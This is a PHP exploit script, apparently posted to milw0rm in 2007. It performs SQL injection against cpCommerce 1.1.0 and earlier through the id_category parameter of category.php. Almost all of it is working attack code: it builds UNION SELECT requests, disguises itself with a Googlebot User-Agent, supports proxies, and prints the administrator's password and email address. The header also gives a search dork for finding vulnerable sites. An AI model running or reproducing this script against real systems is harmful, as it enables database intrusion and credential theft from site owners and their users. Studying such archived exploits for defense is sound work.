<?/*
Exploit Name:
cpCommerce <= 1.1.0 (category.php id_category) Remote SQL Injection Exploit

Autor: Kacper
Contact: kacper1964@yahoo.pl
Homepage: http://www.rahim.webd.pl/
Irc: irc.milw0rm.com:6667 #devilteam 

Pozdro dla wszystkich z kanalu IRC oraz forum DEVIL TEAM.

Pozdrawiam pl.zone-h.org, a najbardziej demo, oraz cala ekipe Zone-H.Org  :)

//dork: "Powered by cpCommerce"
script homepage/download/demo: http://cpcommerce.org/
*/
if ($argc<3) {
print_r('
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Usage: php '.$argv[0].' host path OPTIONS
host:       target server (ip/hostname)
path:       cpCommerce path
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
 -t[prefix]:  database prefix (Default: cp)
Example:
php '.$argv[0].' 127.0.0.1 /cpCommerce/
php '.$argv[0].' 127.0.0.1 /cpCommerce/ -tcp -P1.1.1.1:80
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
');
die;
}
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function wyslijpakiet($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$prefix="cp";
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-t")
{
  $prefix=str_replace("-t","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die("Bad path!");}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
function char_convert($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
print "+++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$packet ="GET ".$p."category.php?id_category=-1/**/UNION/**/SELECT/**/0,CONCAT(".char_convert("<!--[").",pass,".char_convert("]-->")."),2,3/**/FROM/**/".$prefix."Accounts/**/WHERE/**/level=3/* HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."category.php\r\n";
$packet.="Accept-Language: pl\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
wyslijpakiet($packet);
sleep(3);
$t=explode("<!--[",$html);
$t2=explode("]-->",$t[1]);
$pass=$t2[0];
echo "Admin Password: ".$pass."\r\n";

$packet ="GET ".$p."category.php?id_category=-1/**/UNION/**/SELECT/**/0,CONCAT(".char_convert("<!--[").",email,".char_convert("]-->")."),2,3/**/FROM/**/".$prefix."Accounts/**/WHERE/**/level=3/* HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."category.php\r\n";
$packet.="Accept-Language: pl\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
wyslijpakiet($packet);
sleep(3);
$t=explode("<!--[",$html);
$t2=explode("]-->",$t[1]);
$email=$t2[0];
echo "Admin E-Mail: ".$email."\r\n";
?>

# milw0rm.com [2007-05-24]
